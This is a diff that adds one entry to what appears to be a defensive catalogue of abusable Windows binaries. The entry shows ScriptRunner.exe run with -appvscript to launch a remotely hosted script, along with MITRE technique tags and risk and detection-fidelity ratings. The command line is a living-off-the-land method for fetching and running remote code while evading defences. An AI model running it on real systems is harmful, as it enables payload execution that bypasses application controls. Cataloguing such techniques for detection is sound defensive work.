@@ -1,0 +1,22 @@
+- command: ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
+  description: Abuse scriptrunner to launch a remotely hosted payload (.exe|.bat|.cmd, etc).
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1202
+      - T1218
+  os:
+    - Windows
+  references:
+    - url1
+  risk: High
+  risk_reason: Manual usage of this binary is typically suspicious and very rare.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically abnormal in most organizations.
+  tool: scriptrunner
+  threatactors:
+    N/A:
+      - N/A
